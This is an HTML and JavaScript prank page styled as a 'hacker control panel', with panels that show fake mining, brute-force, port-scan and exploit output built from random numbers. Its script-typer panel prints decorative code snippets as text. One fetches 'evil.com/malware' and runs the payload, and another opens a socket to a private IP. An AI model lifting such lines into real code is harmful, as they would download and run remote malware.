<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Ahmad's Keller - Control Panel</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  body {
    margin: 0; 
    background: black; 
    color: #00ff00; 
    font-family: 'Share Tech Mono', monospace;
    user-select: none;
    overflow: hidden;
  }
  header {
    background: #003300;
    padding: 10px 20px;
    border-bottom: 2px solid #00ff00;
    box-shadow: 0 0 15px #00ff00;
  }
  header h1 {
    margin: 0;
    font-weight: normal;
    text-shadow: 0 0 8px #00ff00;
    font-size: 1.8rem;
  }
  #buttons {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    background: #001a00;
    padding: 15px;
    border-bottom: 2px solid #00ff00;
    box-shadow: inset 0 0 15px #00ff00;
  }
  .toggle-btn {
    background: transparent;
    border: 2px solid #00ff00;
    color: #00ff00;
    padding: 8px 18px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 1rem;
    cursor: pointer;
    box-shadow: 0 0 10px #00ff00;
    transition: background 0.3s ease, color 0.3s ease;
    user-select: none;
  }
  .toggle-btn.active {
    background: #00ff00;
    color: black;
    box-shadow: 0 0 30px #00ff00;
  }
  main {
    display: flex;
    height: calc(100vh - 110px);
    gap: 12px;
    padding: 10px 20px;
    box-sizing: border-box;
  }
  .panel {
    flex: 1;
    background: rgba(0, 0, 0, 0.95);
    border: 2px solid #00ff00;
    box-shadow: 0 0 25px #00ff00;
    color: #00ff00;
    font-size: 0.85rem;
    font-family: 'Share Tech Mono', monospace;
    padding: 12px;
    overflow-y: auto;
    white-space: pre-wrap;
    user-select: text;
  }
  .panel.hidden {
    display: none;
  }
  /* Scrollbar styling */
  .panel::-webkit-scrollbar {
    width: 8px;
  }
  .panel::-webkit-scrollbar-track {
    background: #001a00;
  }
  .panel::-webkit-scrollbar-thumb {
    background: #00ff00;
    border-radius: 4px;
  }
</style>
</head>
<body>

<header>
  <h1>Ahmad's Keller - Control Panel</h1>
</header>

<div id="buttons">
  <button class="toggle-btn" data-target="miner">Miner</button>
  <button class="toggle-btn" data-target="script-typer">Script Typer</button>
  <button class="toggle-btn" data-target="brute-force">Brute Force</button>
  <button class="toggle-btn" data-target="sys-monitor">System Monitor</button>
  <button class="toggle-btn" data-target="hacker3">Hacker Terminal 3</button>
  <button class="toggle-btn" data-target="hacker4">Hacker Terminal 4</button>
</div>

<main>
  <div id="miner" class="panel hidden" aria-live="polite" aria-label="Miner output"></div>
  <div id="script-typer" class="panel hidden" aria-live="polite" aria-label="Script typing output"></div>
  <div id="brute-force" class="panel hidden" aria-live="polite" aria-label="Brute force attempts"></div>
  <div id="sys-monitor" class="panel hidden" aria-live="polite" aria-label="System monitoring"></div>
  <div id="hacker3" class="panel hidden" aria-live="polite" aria-label="Hacker terminal 3 output"></div>
  <div id="hacker4" class="panel hidden" aria-live="polite" aria-label="Hacker terminal 4 output"></div>
</main>

<script>
  // Toggle button behavior: toggles panel visibility and button active state
  const buttons = document.querySelectorAll('.toggle-btn');
  buttons.forEach(button => {
    button.addEventListener('click', () => {
      const targetId = button.getAttribute('data-target');
      const panel = document.getElementById(targetId);
      const isActive = button.classList.toggle('active');
      if (isActive) {
        panel.classList.remove('hidden');
        startPanel(targetId);
      } else {
        panel.classList.add('hidden');
        stopPanel(targetId);
      }
    });
  });

  // Panels
  const panels = {
    miner: document.getElementById('miner'),
    'script-typer': document.getElementById('script-typer'),
    'brute-force': document.getElementById('brute-force'),
    'sys-monitor': document.getElementById('sys-monitor'),
    hacker3: document.getElementById('hacker3'),
    hacker4: document.getElementById('hacker4'),
  };

  // Interval references for stopping
  const intervals = {};

  // Miner simulation
  function startMiner() {
    if (intervals.miner) return;
    let hashes = 0;
    intervals.miner = setInterval(() => {
      if (!panels.miner.classList.contains('hidden')) {
        hashes += Math.floor(Math.random() * 500 + 200);
        panels.miner.textContent = `Mining hashes... ${hashes} hashes computed\nHash rate: ${(Math.random()*120 + 80).toFixed(2)} KH/s\nPool: miner.ahmadskeller.io\nWallet: 0xdeadbeefcafebabe`;
      } else {
        clearInterval(intervals.miner);
        intervals.miner = null;
      }
    }, 1000);
  }

  // Script Typer simulation
  function startScriptTyper() {
    if (intervals['script-typer']) return;
    const snippets = [
      'function exploit() {\n  const payload = "\\x90\\x90\\x90";\n  execute(payload);\n}',
      'const net = require("net");\nconst client = new net.Socket();\nclient.connect(1337, "192.168.1.10");',
      'while(true) {\n  scanPorts();\n  sleep(500);\n}',
      'if(authenticated) {\n  escalatePrivileges();\n  openBackdoor();\n}',
      'fetch("http://evil.com/malware").then(res => res.arrayBuffer()).then(runPayload);',
      'try {\n  triggerBufferOverflow();\n} catch(e) {\n  log(e);\n}',
    ];
    let idx = 0;
    let charIndex = 0;
    panels['script-typer'].textContent = '';
    intervals['script-typer'] = setInterval(() => {
      if (panels['script-typer'].classList.contains('hidden')) {
        clearInterval(intervals['script-typer']);
        intervals['script-typer'] = null;
        return;
      }
      if (charIndex < snippets[idx].length) {
        panels['script-typer'].textContent += snippets[idx][charIndex];
        charIndex++;
        panels['script-typer'].scrollTop = panels['script-typer'].scrollHeight;
      } else {
        panels['script-typer'].textContent += '\n\n';
        idx = (idx + 1) % snippets.length;
        charIndex = 0;
      }
    }, 40);
  }

  // Brute Force simulation
  const fakeUsers = ['admin', 'root', 'guest', 'user', 'test', 'ahmad', 'hacker', 'sysadmin', 'operator', 'backup'];
  const fakePasswords = ['123456', 'password', 'qwerty', 'letmein', 'trustno1', 'iloveyou', 'monkey', 'dragon', 'sunshine', 'supersecret'];
  function startBruteForce() {
    if (intervals['brute-force']) return;
    intervals['brute-force'] = setInterval(() => {
      if (panels['brute-force'].classList.contains('hidden')) {
        clearInterval(intervals['brute-force']);
        intervals['brute-force'] = null;
        return;
      }
      const user = fakeUsers[Math.floor(Math.random()*fakeUsers.length)];
      const pass = fakePasswords[Math.floor(Math.random()*fakePasswords.length)];
      panels['brute-force'].textContent += `Trying username: ${user} with password: ${pass} ...\n`;
      if (Math.random() > 0.98) {
        panels['brute-force'].textContent += `SUCCESS! Logged in as ${user}\n\n`;
      }
      panels['brute-force'].scrollTop = panels['brute-force'].scrollHeight;
      if (panels['brute-force'].textContent.length > 2000) {
        panels['brute-force'].textContent = panels['brute-force'].textContent.slice(-1000);
      }
    }, 700);
  }

  // System Monitor fake data
  function startSysMonitor() {
    if (intervals['sys-monitor']) return;
    intervals['sys-monitor'] = setInterval(() => {
      if (panels['sys-monitor'].classList.contains('hidden')) {
        clearInterval(intervals['sys-monitor']);
        intervals['sys-monitor'] = null;
        return;
      }
      const cpu = (Math.random() * 90 + 5).toFixed(0);
      const ram = (Math.random() * 75 + 20).toFixed(0);
      const net = (Math.random() * 500).toFixed(2);
      const disk = (Math.random() * 80 + 10).toFixed(0);
      const processes = Math.floor(Math.random() * 180 + 70);
      const temp = Math.floor(Math.random() * 45 + 40);
      const firewall = Math.random() > 0.3 ? 'Active' : 'Inactive';
      const vpn = Math.random() > 0.5 ? 'Connected' : 'Disconnected';
      panels['sys-monitor'].textContent = 
`CPU Usage: ${cpu}%
RAM Usage: ${ram}%
Network: ${net} Mbps
Disk Usage: ${disk}%
Processes: ${processes}
Temperature: ${temp} Â°C
Firewall: ${firewall}
VPN: ${vpn}
`;
    }, 2000);
  }

  // Hacker Terminal 3 simulation (port scanning)
  const ports = [21,22,23,25,53,80,110,139,143,443,445,3389];
  function startHacker3() {
    if (intervals.hacker3) return;
    intervals.hacker3 = setInterval(() => {
      if (panels.hacker3.classList.contains('hidden')) {
        clearInterval(intervals.hacker3);
        intervals.hacker3 = null;
        return;
      }
      const port = ports[Math.floor(Math.random()*ports.length)];
      const status = Math.random() > 0.7 ? 'OPEN' : 'CLOSED';
      panels.hacker3.textContent += `Port scan ${port}: ${status}\n`;
      if (panels.hacker3.textContent.length > 2000) {
        panels.hacker3.textContent = panels.hacker3.textContent.slice(-1000);
      }
      panels.hacker3.scrollTop = panels.hacker3.scrollHeight;
    }, 500);
  }

  // Hacker Terminal 4 simulation (exploits attempts)
  const exploits = [
    'SQL Injection',
    'Buffer Overflow',
    'Cross-site Scripting',
    'Privilege Escalation',
    'Zero-day Exploit',
    'Remote Code Execution',
    'DNS Spoofing',
    'ARP Poisoning',
    'Password Cracking',
    'Man-in-the-Middle Attack',
  ];
  function startHacker4() {
    if (intervals.hacker4) return;
    intervals.hacker4 = setInterval(() => {
      if (panels.hacker4.classList.contains('hidden')) {
        clearInterval(intervals.hacker4);
        intervals.hacker4 = null;
        return;
      }
      const exploit = exploits[Math.floor(Math.random()*exploits.length)];
      const result = Math.random() > 0.6 ? 'SUCCESS' : 'FAIL';
      panels.hacker4.textContent += `Attempting ${exploit} ... ${result}\n`;
      if (panels.hacker4.textContent.length > 2000) {
        panels.hacker4.textContent = panels.hacker4.textContent.slice(-1000);
      }
      panels.hacker4.scrollTop = panels.hacker4.scrollHeight;
    }, 800);
  }

  // Start panel's simulation when toggled on
  function startPanel(name) {
    switch(name) {
      case 'miner': startMiner(); break;
      case 'script-typer': startScriptTyper(); break;
      case 'brute-force': startBruteForce(); break;
      case 'sys-monitor': startSysMonitor(); break;
      case 'hacker3': startHacker3(); break;
      case 'hacker4': startHacker4(); break;
    }
  }

  // Stop panel's simulation when toggled off
  function stopPanel(name) {
    if (intervals[name]) {
      clearInterval(intervals[name]);
      intervals[name] = null;
    }
  }
</script>

</body>
</html>
